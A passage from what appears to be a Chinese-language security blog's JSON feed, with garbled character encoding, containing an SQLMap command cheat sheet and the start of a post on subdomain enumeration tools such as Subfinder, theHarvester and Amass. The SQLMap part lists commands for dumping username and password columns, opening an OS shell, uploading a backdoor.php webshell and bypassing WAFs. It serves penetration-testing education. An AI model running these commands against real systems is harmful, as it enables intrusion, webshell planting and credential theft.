è¯·æ±‚æ³¨å…¥</td>\n<td><code>--data</code></td>\n<td>æäº¤ POST æ•°æ®</td>\n<td><code>sqlmap -u &quot;http://x.com/login.php&quot; --data=&quot;user=admin&amp;pass=123&quot;</code></td>\n</tr>\n<tr>\n<td>Cookie æ³¨å…¥</td>\n<td><code>--cookie</code></td>\n<td>æºå¸¦ Cookie ä¿¡æ¯</td>\n<td><code>sqlmap -u &quot;http://x.com&quot; --cookie=&quot;PHPSESSID=123&quot;</code></td>\n</tr>\n<tr>\n<td>å¼ºåˆ¶ dbms</td>\n<td><code>--dbms=&lt;ç±»å‹&gt;</code></td>\n<td>å¼ºåˆ¶æŒ‡å®šæ•°æ®åº“ç±»å‹</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --dbms=mysql</code></td>\n</tr>\n<tr>\n<td>ç»•è¿‡ WAF</td>\n<td><code>--tamper=&lt;è„šæœ¬&gt;</code></td>\n<td>ä½¿ç”¨ Tamper è„šæœ¬</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --tamper=charunicodeencode</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"ï¼ˆäºŒï¼‰æ•°æ®æšä¸¾ç±»-ğŸ“š\"><a href=\"#ï¼ˆäºŒï¼‰æ•°æ®æšä¸¾ç±»-ğŸ“š\" class=\"headerlink\" title=\"ï¼ˆäºŒï¼‰æ•°æ®æšä¸¾ç±» ğŸ“š\"></a>ï¼ˆäºŒï¼‰æ•°æ®æšä¸¾ç±» ğŸ“š</h3><table>\n<thead>\n<tr>\n<th>ä»»åŠ¡åˆ†ç±»</th>\n<th>å‘½ä»¤é€‰é¡¹</th>\n<th>è¯´æ˜</th>\n<th>ç¤ºä¾‹å‘½ä»¤</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>æšä¸¾æ‰€æœ‰æ•°æ®åº“</td>\n<td><code>--dbs</code></td>\n<td>åˆ—å‡ºç›®æ ‡æ‰€æœ‰æ•°æ®åº“</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --dbs</code></td>\n</tr>\n<tr>\n<td>æšä¸¾æŒ‡å®šæ•°æ®åº“è¡¨</td>\n<td><code>-D &lt;db&gt; --tables</code></td>\n<td>åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; -D mydb --tables</code></td>\n</tr>\n<tr>\n<td>æšä¸¾å­—æ®µ</td>\n<td><code>-D &lt;db&gt; -T &lt;table&gt; --columns</code></td>\n<td>åˆ—å‡ºè¡¨å­—æ®µ</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; -D mydb -T users --columns</code></td>\n</tr>\n<tr>\n<td>å¯¼å‡ºå­—æ®µæ•°æ®</td>\n<td><code>-D &lt;db&gt; -T &lt;table&gt; -C &lt;cols&gt; --dump</code></td>\n<td>æŒ‡å®šå­—æ®µå¹¶å¯¼å‡º</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; -D mydb -T users -C username,password --dump</code></td>\n</tr>\n<tr>\n<td>è·å–æ•°æ®åº“ç”¨æˆ·</td>\n<td><code>--users</code></td>\n<td>è·å–æ•°æ®åº“ç”¨æˆ·ä¿¡æ¯</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --users</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"ï¼ˆä¸‰ï¼‰é«˜çº§æ“ä½œç±»-ğŸ› ï¸\"><a href=\"#ï¼ˆä¸‰ï¼‰é«˜çº§æ“ä½œç±»-ğŸ› ï¸\" class=\"headerlink\" title=\"ï¼ˆä¸‰ï¼‰é«˜çº§æ“ä½œç±» ğŸ› ï¸\"></a>ï¼ˆä¸‰ï¼‰é«˜çº§æ“ä½œç±» ğŸ› ï¸</h3><table>\n<thead>\n<tr>\n<th>ä»»åŠ¡åˆ†ç±»</th>\n<th>å‘½ä»¤é€‰é¡¹</th>\n<th>è¯´æ˜</th>\n<th>ç¤ºä¾‹å‘½ä»¤</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>è·å–ç³»ç»Ÿ Shell</td>\n<td><code>--os-shell</code></td>\n<td>æ‰“å¼€ OS Shellï¼ˆé«˜æƒé™éœ€ï¼‰</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --os-shell</code></td>\n</tr>\n<tr>\n<td>ä¸Šä¼ æ–‡ä»¶</td>\n<td><code>--file-write/--file-dest</code></td>\n<td>ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php</code></td>\n</tr>\n<tr>\n<td>æƒé™æå‡</td>\n<td><code>--priv-esc</code></td>\n<td>æ•°æ®åº“ç”¨æˆ·æƒé™æå‡å°è¯•</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --priv-esc</code></td>\n</tr>\n<tr>\n<td>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</td>\n<td><code>--os-cmd=&quot;&lt;å‘½ä»¤&gt;&quot;</code></td>\n<td>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --os-cmd=&quot;whoami&quot;</code></td>\n</tr>\n</tbody></table>\n<h2 id=\"äºŒã€ğŸ¯-å®ç”¨åœºæ™¯å‘½ä»¤ç¤ºä¾‹\"><a href=\"#äºŒã€ğŸ¯-å®ç”¨åœºæ™¯å‘½ä»¤ç¤ºä¾‹\" class=\"headerlink\" title=\"äºŒã€ğŸ¯ å®ç”¨åœºæ™¯å‘½ä»¤ç¤ºä¾‹\"></a>äºŒã€ğŸ¯ å®ç”¨åœºæ™¯å‘½ä»¤ç¤ºä¾‹</h2><h3 id=\"âœ…-åŸºç¡€æ³¨å…¥æ£€æµ‹\"><a href=\"#âœ…-åŸºç¡€æ³¨å…¥æ£€æµ‹\" class=\"headerlink\" title=\"âœ… åŸºç¡€æ³¨å…¥æ£€æµ‹\"></a>âœ… åŸºç¡€æ³¨å…¥æ£€æµ‹</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># åŸºæœ¬ GET è¯·æ±‚æ³¨å…¥</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://testphp.vulnweb.com/artists.php?artist=1&quot;</span> --batch<br><br><span class=\"hljs-comment\"># POST è¡¨å•æ³¨å…¥ï¼ˆå¦‚ç™»å½•ï¼‰</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/login.php&quot;</span> --data=<span class=\"hljs-string\">&quot;username=admin&amp;password=admin&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ğŸ“š-æ•°æ®æšä¸¾ä¸å¯¼å‡º\"><a href=\"#ğŸ“š-æ•°æ®æšä¸¾ä¸å¯¼å‡º\" class=\"headerlink\" title=\"ğŸ“š æ•°æ®æšä¸¾ä¸å¯¼å‡º\"></a>ğŸ“š æ•°æ®æšä¸¾ä¸å¯¼å‡º</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><br><span class=\"hljs-comment\"># æšä¸¾æ•°æ®åº“</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> --dbs<br><br><span class=\"hljs-comment\"># æšä¸¾æŒ‡å®šæ•°æ®åº“è¡¨</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> -D testdb --tables<br><br><span class=\"hljs-comment\"># æšä¸¾è¡¨å­—æ®µ</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> -D testdb -T <span class=\"hljs-built_in\">users</span> --columns<br><br><span class=\"hljs-comment\"># å¯¼å‡ºå­—æ®µæ•°æ®</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> -D testdb -T <span class=\"hljs-built_in\">users</span> -C username,password --dump<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ğŸ§¨-é«˜çº§æ¸—é€æ“ä½œ\"><a href=\"#ğŸ§¨-é«˜çº§æ¸—é€æ“ä½œ\" class=\"headerlink\" title=\"ğŸ§¨ é«˜çº§æ¸—é€æ“ä½œ\"></a>ğŸ§¨ é«˜çº§æ¸—é€æ“ä½œ</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># è·å– OS Shell</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> --os-shell<br><br><span class=\"hljs-comment\"># ä¸Šä¼  WebShell</span><br>sqlmap -u <span class=\"hljs-string\">&quot;http://target.com/index.php?id=1&quot;</span> --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php<br></code></pre></td></tr></table></figure>\n\n\n<h2 id=\"ä¸‰ã€ğŸ›ï¸-å…³é”®å‚æ•°ä¸ä½¿ç”¨æŠ€å·§\"><a href=\"#ä¸‰ã€ğŸ›ï¸-å…³é”®å‚æ•°ä¸ä½¿ç”¨æŠ€å·§\" class=\"headerlink\" title=\"ä¸‰ã€ğŸ›ï¸ å…³é”®å‚æ•°ä¸ä½¿ç”¨æŠ€å·§\"></a>ä¸‰ã€ğŸ›ï¸ å…³é”®å‚æ•°ä¸ä½¿ç”¨æŠ€å·§</h2><h3 id=\"ğŸ“-æ£€æµ‹æ§åˆ¶\"><a href=\"#ğŸ“-æ£€æµ‹æ§åˆ¶\" class=\"headerlink\" title=\"ğŸ“ æ£€æµ‹æ§åˆ¶\"></a>ğŸ“ æ£€æµ‹æ§åˆ¶</h3><table>\n<thead>\n<tr>\n<th>å‚æ•°</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>--level=1~5</code></td>\n<td>è®¾ç½®æ£€æµ‹æ·±åº¦ï¼ˆé»˜è®¤ 1ï¼‰ï¼Œé«˜ç­‰çº§æ£€æµ‹æ›´å¤šå‚æ•°</td>\n</tr>\n<tr>\n<td><code>--risk=1~3</code></td>\n<td>è®¾ç½®é£é™©ç­‰çº§ï¼ˆé»˜è®¤ 1ï¼‰ï¼Œé«˜ç­‰çº§å°è¯•æ›´å±é™© payload</td>\n</tr>\n<tr>\n<td><code>--random-agent</code></td>\n<td>ä½¿ç”¨éšæœº UAï¼Œå‡å°‘è¢«è¯†åˆ«ä¸ºå·¥å…·æ¦‚ç‡</td>\n</tr>\n</tbody></table>\n<h3 id=\"ğŸ§°-è°ƒè¯•ä¸ä»£ç†æ”¯æŒ\"><a href=\"#ğŸ§°-è°ƒè¯•ä¸ä»£ç†æ”¯æŒ\" class=\"headerlink\" title=\"ğŸ§° è°ƒè¯•ä¸ä»£ç†æ”¯æŒ\"></a>ğŸ§° è°ƒè¯•ä¸ä»£ç†æ”¯æŒ</h3><table>\n<thead>\n<tr>\n<th>å‚æ•°</th>\n<th>åŠŸèƒ½</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>--proxy=&quot;http://127.0.0.1:8080&quot;</code></td>\n<td>é…åˆ Burp æŠ“åŒ…è°ƒè¯•</td>\n</tr>\n<tr>\n<td><code>-v 0~6</code></td>\n<td>æ—¥å¿—è¾“å‡ºè¯¦ç»†ç¨‹åº¦ï¼ˆå¦‚ <code>-v 3</code> æ˜¾ç¤º payloadï¼‰</td>\n</tr>\n<tr>\n<td><code>--flush-session</code></td>\n<td>æ¸…é™¤ç¼“å­˜ï¼Œé‡æ–°æ£€æµ‹</td>\n</tr>\n</tbody></table>\n<h3 id=\"ğŸ•³ï¸-ç»•è¿‡é˜²æŠ¤æŠ€å·§\"><a href=\"#ğŸ•³ï¸-ç»•è¿‡é˜²æŠ¤æŠ€å·§\" class=\"headerlink\" title=\"ğŸ•³ï¸ ç»•è¿‡é˜²æŠ¤æŠ€å·§\"></a>ğŸ•³ï¸ ç»•è¿‡é˜²æŠ¤æŠ€å·§</h3><table>\n<thead>\n<tr>\n<th>è„šæœ¬å</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>apostrophemask</code></td>\n<td>ç¼–ç å•å¼•å·ç»•è¿‡</td>\n</tr>\n<tr>\n<td><code>base64encode</code></td>\n<td>å¯¹ Payload Base64 ç¼–ç ç»•è¿‡</td>\n</tr>\n<tr>\n<td><code>space2comment</code></td>\n<td>ä½¿ç”¨æ³¨é‡Šä»£æ›¿ç©ºæ ¼ï¼ˆå¦‚ï¼š<code>SELECT/**/1</code>ï¼‰</td>\n</tr>\n</tbody></table>\n<p>ç¤ºä¾‹ï¼š</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">sqlmap -u <span class=\"hljs-string\">&quot;...?id=1&quot;</span> --tamper=base64encode<br><span class=\"hljs-comment\"># å¤šè„šæœ¬ç»„åˆ</span><br>sqlmap -u <span class=\"hljs-string\">&quot;...?id=1&quot;</span> --tamper=between,charunicodeencode<br></code></pre></td></tr></table></figure>\n\n\n<h2 id=\"å››ã€ğŸ“Œ-å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨\"><a href=\"#å››ã€ğŸ“Œ-å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨\" class=\"headerlink\" title=\"å››ã€ğŸ“Œ å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨\"></a>å››ã€ğŸ“Œ å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨</h2><table>\n<thead>\n<tr>\n<th>åŠŸèƒ½</th>\n<th>ç¤ºä¾‹å‘½ä»¤</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>åŸºç¡€æ£€æµ‹</td>\n<td><code>sqlmap -u &quot;http://x.com/?id=1&quot;</code></td>\n</tr>\n<tr>\n<td>POST æ³¨å…¥</td>\n<td><code>sqlmap -u &quot;http://x.com/login.php&quot; --data=&quot;user=admin&amp;pass=123&quot;</code></td>\n</tr>\n<tr>\n<td>æšä¸¾æ•°æ®åº“</td>\n<td><code>sqlmap -u &quot;...?id=1&quot; --dbs</code></td>\n</tr>\n<tr>\n<td>æšä¸¾è¡¨ä¸å­—æ®µ</td>\n<td><code>-D mydb --tables</code>ã€<code>-T users --columns</code></td>\n</tr>\n<tr>\n<td>å¯¼å‡ºæ•°æ®</td>\n<td><code>-D db -T table -C col1,col2 --dump</code></td>\n</tr>\n<tr>\n<td>è·å–ç³»ç»Ÿ Shell</td>\n<td><code>--os-shell</code></td>\n</tr>\n<tr>\n<td>ç»•è¿‡ WAF</td>\n<td><code>--tamper=base64encode</code></td>\n</tr>\n</tbody></table>\n<p>âœ… <strong>æ€»ç»“ä¸å»ºè®®</strong></p>\n<ul>\n<li>ğŸ” åˆ‡å‹¿åœ¨æœªæˆæƒç›®æ ‡ä¸Šä½¿ç”¨ SQLMapï¼</li>\n<li>ğŸ”„ æ¨èä½¿ç”¨ <code>--batch</code> é¿å…äº¤äº’ä¸­æ–­ï¼Œé€‚åˆè„šæœ¬åŒ–æ‰§è¡Œã€‚</li>\n<li>ğŸ§ª åˆ©ç”¨ <code>-r</code> åŠ è½½ Burp æ•è·çš„è¯·æ±‚æ–‡ä»¶ï¼Œæ›´çœŸå®æ¨¡æ‹Ÿæ”»å‡»åœºæ™¯ã€‚</li>\n<li>ğŸ“Œ å¸¸ç”¨æŒ‡ä»¤å¯æ•´ç†æˆè„šæœ¬ï¼Œæå‡å®æˆ˜æ•ˆç‡ã€‚</li>\n</ul>\n",
            "tags": [
                "å·¥å…·",
                "sqlmap",
                "æ¸—é€æµ‹è¯•"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/21/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7/",
            "url": "https://bae-ace.github.io/2025/07/21/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7/",
            "title": "å­åŸŸåæšä¸¾å·¥å…·",
            "date_published": "2025-07-21T01:30:22.000Z",
            "content_html": "<h2 id=\"1ï¸âƒ£-Subfinder\"><a href=\"#1ï¸âƒ£-Subfinder\" class=\"headerlink\" title=\"1ï¸âƒ£ Subfinder\"></a>1ï¸âƒ£ Subfinder</h2><ul>\n<li><strong>é¡¹ç›®åœ°å€</strong>ï¼š<a href=\"https://github.com/projectdiscovery/subfinder\">ğŸ”— https://github.com/projectdiscovery/subfinder</a>  </li>\n<li><strong>åŠŸèƒ½</strong>ï¼šå¿«é€Ÿã€å¯é çš„å­åŸŸåæšä¸¾å·¥å…·ï¼Œé›†æˆå¤šä¸ªè¢«åŠ¨æ•°æ®æº  </li>\n<li><strong>è¯­è¨€</strong>ï¼šGo</li>\n</ul>\n<h3 id=\"âœ…-å®‰è£…é…ç½®\"><a href=\"#âœ…-å®‰è£…é…ç½®\" class=\"headerlink\" title=\"âœ… å®‰è£…é…ç½®\"></a>âœ… å®‰è£…é…ç½®</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># å®‰è£… Go è¯­è¨€ç¯å¢ƒ</span><br><span class=\"hljs-built_in\">sudo</span> apt update<br><span class=\"hljs-built_in\">sudo</span> apt install golang-go -y<br><br><span class=\"hljs-comment\"># éªŒè¯ Go å®‰è£…</span><br>go version<br><br><span class=\"hljs-comment\"># é…ç½® Go ç¯å¢ƒå˜é‡ï¼ˆæŒ‰éœ€ï¼‰</span><br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&#x27;export GOPATH=$HOME/go&#x27;</span> &gt;&gt; ~/.zshrc<br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&#x27;export PATH=$PATH:$GOPATH/bin&#x27;</span> &gt;&gt; ~/.zshrc<br><span class=\"hljs-built_in\">source</span> ~/.zshrc<br><br><span class=\"hljs-comment\"># è®¾ç½® Go æ¨¡å—ä»£ç†</span><br>go <span class=\"hljs-built_in\">env</span> -w GOPROXY=https://goproxy.cn,direct<br><br><span class=\"hljs-comment\"># å®‰è£… Subfinder</span><br>go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest<br><br><span class=\"hljs-comment\"># éªŒè¯å®‰è£…</span><br>subfinder -version || <span class=\"hljs-built_in\">sudo</span> <span class=\"hljs-built_in\">ln</span> -s <span class=\"hljs-variable\">$HOME</span>/go/bin/subfinder /usr/local/bin/subfinder<br>â€‹````<br><br><span class=\"hljs-comment\">### ğŸ›  å¸¸è§ç”¨æ³•</span><br><br>â€‹```bash<br><span class=\"hljs-comment\"># åŸºæœ¬å­åŸŸåæšä¸¾</span><br>subfinder -d example.com<br><br><span class=\"hljs-comment\"># è¾“å‡ºåˆ°æ–‡ä»¶</span><br>subfinder -d example.com -o result.txt<br><br><span class=\"hljs-comment\"># ä½¿ç”¨é…ç½®æ–‡ä»¶ï¼ˆæ¨èè®¾ç½® APIï¼‰</span><br>subfinder -d example.com -pc subfinder-config.yaml<br><br><span class=\"hljs-comment\"># æ‰¹é‡æ‰«æå¤šä¸ªåŸŸå</span><br>subfinder -dL domains.txt -oL output.txt<br><br><span class=\"hljs-comment\"># é…åˆ httpx æ¢æµ‹æ´»è·ƒå­åŸŸ</span><br>subfinder -d example.com | httpx -silent<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"2ï¸âƒ£-Knock\"><a href=\"#2ï¸âƒ£-Knock\" class=\"headerlink\" title=\"2ï¸âƒ£ Knock\"></a>2ï¸âƒ£ Knock</h2><ul>\n<li><p><strong>é¡¹ç›®åœ°å€</strong>ï¼š<a href=\"https://github.com/guelfoweb/knock\">ğŸ”— https://github.com/guelfoweb/knock</a></p>\n</li>\n<li><p><strong>åŠŸèƒ½</strong>ï¼šPython ç¼–å†™çš„å­åŸŸåçˆ†ç ´å·¥å…·ï¼Œä½¿ç”¨å­—å…¸æšä¸¾</p>\n</li>\n<li><p><strong>è¯­è¨€</strong>ï¼šPython</p>\n</li>\n<li><p><strong>ç‰¹ç‚¹</strong>ï¼š</p>\n<ul>\n<li>å¯è‡ªå®šä¹‰å­—å…¸è¿›è¡Œæš´åŠ›æšä¸¾</li>\n<li>æ”¯æŒ WHOIS æ£€æµ‹</li>\n<li>è„šæœ¬åŒ–æ‰©å±•èƒ½åŠ›å¼º</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"âœ…-å®‰è£…æ–¹å¼\"><a href=\"#âœ…-å®‰è£…æ–¹å¼\" class=\"headerlink\" title=\"âœ… å®‰è£…æ–¹å¼\"></a>âœ… å®‰è£…æ–¹å¼</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/guelfoweb/knock.git<br><span class=\"hljs-built_in\">cd</span> knock<br>pip3 install -r requirements.txt<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ğŸ› -å¸¸è§ç”¨æ³•\"><a href=\"#ğŸ› -å¸¸è§ç”¨æ³•\" class=\"headerlink\" title=\"ğŸ›  å¸¸è§ç”¨æ³•\"></a>ğŸ›  å¸¸è§ç”¨æ³•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># ä½¿ç”¨é»˜è®¤å­—å…¸</span><br>python3 knockpy.py example.com<br><br><span class=\"hljs-comment\"># æŒ‡å®šå­—å…¸</span><br>python3 knockpy.py example.com -w /path/to/wordlist.txt<br><br><span class=\"hljs-comment\"># è¾“å‡ºç»“æœä¿å­˜åˆ°ç›®å½•</span><br>python3 knockpy.py example.com -o output_dir<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"3ï¸âƒ£-TheHarvester\"><a href=\"#3ï¸âƒ£-TheHarvester\" class=\"headerlink\" title=\"3ï¸âƒ£ TheHarvester\"></a>3ï¸âƒ£ TheHarvester</h2><ul>\n<li><p><strong>é¡¹ç›®åœ°å€</strong>ï¼š<a href=\"https://github.com/laramies/theHarvester\">ğŸ”— https://github.com/laramies/theHarvester</a></p>\n</li>\n<li><p><strong>åŠŸèƒ½</strong>ï¼šä¿¡æ¯æ”¶é›†åˆ©å™¨ï¼Œå¯ç”¨äºæšä¸¾å­åŸŸåã€é‚®ç®±ã€å‘˜å·¥ã€IP ç­‰</p>\n</li>\n<li><p><strong>è¯­è¨€</strong>ï¼šPython</p>\n</li>\n<li><p><strong>ç‰¹ç‚¹</strong>ï¼š</p>\n<ul>\n<li>è¢«åŠ¨ä¿¡æ¯æ”¶é›†ï¼Œæ”¯æŒå¤šä¸ªæœç´¢å¼•æ“</li>\n<li>å¯æ”¶é›†é‚®ç®±&#x2F;IP ç­‰ç¤¾å·¥ä¿¡æ¯</li>\n<li>é€‚åˆ APT æƒ…æŠ¥åˆ†æä¸å‰æœŸä¾¦å¯Ÿ</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"âœ…-å®‰è£…æ–¹å¼ï¼ˆKali-è‡ªå¸¦ï¼‰\"><a href=\"#âœ…-å®‰è£…æ–¹å¼ï¼ˆKali-è‡ªå¸¦ï¼‰\" class=\"headerlink\" title=\"âœ… å®‰è£…æ–¹å¼ï¼ˆKali è‡ªå¸¦ï¼‰\"></a>âœ… å®‰è£…æ–¹å¼ï¼ˆKali è‡ªå¸¦ï¼‰</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/laramies/theHarvester.git<br><span class=\"hljs-built_in\">cd</span> theHarvester<br>pip3 install -r requirements.txt<br>python3 theHarvester.py -h<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ğŸ› -å¸¸è§ç”¨æ³•-1\"><a href=\"#ğŸ› -å¸¸è§ç”¨æ³•-1\" class=\"headerlink\" title=\"ğŸ›  å¸¸è§ç”¨æ³•\"></a>ğŸ›  å¸¸è§ç”¨æ³•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># ä½¿ç”¨ Baidu æšä¸¾å­åŸŸ</span><br>python3 theHarvester.py -d example.com -b baidu<br><br><span class=\"hljs-comment\"># å¤šä¸ªæœç´¢å¼•æ“ç»„åˆä½¿ç”¨</span><br>python3 theHarvester.py -d example.com -b bing,crtsh<br><br><span class=\"hljs-comment\"># è¾“å‡ºä¸º HTML æ–‡ä»¶</span><br>python3 theHarvester.py -d example.com -b bing -f result<br><br><span class=\"hljs-comment\"># æŸ¥çœ‹æ‰€æœ‰æ”¯æŒçš„æ•°æ®æº</span><br>python3 theHarvester.py -h<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"4ï¸âƒ£-Amass\"><a href=\"#4ï¸âƒ£-Amass\" class=\"headerlink\" title=\"4ï¸âƒ£ Amass\"></a>4ï¸âƒ£ Amass</h2><ul>\n<li><p><strong>é¡¹ç›®åœ°å€</strong>ï¼š<a href=\"https://github.com/OWASP/Amass\">ğŸ”— https://github.com/OWASP/Amass</a></p>\n</li>\n<li><p><strong>åŠŸèƒ½</strong>ï¼šæœ€å¼ºå¤§çš„å­åŸŸåæšä¸¾æ¡†æ¶ä¹‹ä¸€ï¼Œæ”¯æŒä¸»åŠ¨&#x2F;è¢«åŠ¨æ··åˆæ¨¡å¼ï¼Œæ•°æ®å¯è§†åŒ–</p>\n</li>\n<li><p><strong>è¯­è¨€</strong>ï¼šGo</p>\n</li>\n<li><p><strong>ç‰¹ç‚¹</strong>ï¼š</p>\n<ul>\n<li>æ”¯æŒä¸»åŠ¨æ‰«æ + è¢«åŠ¨æ”¶é›† + æ··åˆæ¨¡å¼</li>\n<li>æ”¯æŒ ASN åˆ†æã€DNS çˆ†ç ´ã€ç«¯å£è¯†åˆ«ç­‰</li>\n<li>è¾“å‡ºæ ¼å¼æ”¯æŒ TXT&#x2F;JSON&#x2F;GDF ç­‰</li>\n<li>å¯è§†åŒ–ç»“æœå¯è”åŠ¨ Neo4jã€Maltego</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"âœ…-å®‰è£…æ–¹å¼ï¼ˆKali-å¯ç›´æ¥å®‰è£…ï¼‰\"><a href=\"#âœ…-å®‰è£…æ–¹å¼ï¼ˆKali-å¯ç›´æ¥å®‰è£…ï¼‰\" class=\"headerlink\" title=\"âœ… å®‰è£…æ–¹å¼ï¼ˆKali å¯ç›´æ¥å®‰è£…ï¼‰\"></a>âœ… å®‰è£…æ–¹å¼ï¼ˆKali å¯ç›´æ¥å®‰è£…ï¼‰</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">sudo</span> apt install 